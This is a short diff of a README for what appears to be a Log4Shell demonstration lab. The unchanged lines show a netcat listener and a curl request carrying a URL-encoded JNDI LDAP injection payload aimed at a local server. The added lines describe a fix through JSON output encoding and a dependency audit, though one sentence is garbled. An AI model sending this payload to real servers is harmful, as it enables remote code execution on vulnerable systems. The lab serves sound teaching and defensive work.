@@ -106,3 +106,11 @@ nc -lv 9001
 ```shell
 curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A1389%2FanyString%7D
 ```
+
+## Fix
+
+Using output encoding (JSON), log injection are not!
+
+Even if app uses a vulnerable version of log4j2. Check it with OSS Index:
+
+./gradlew ossIndexAudit
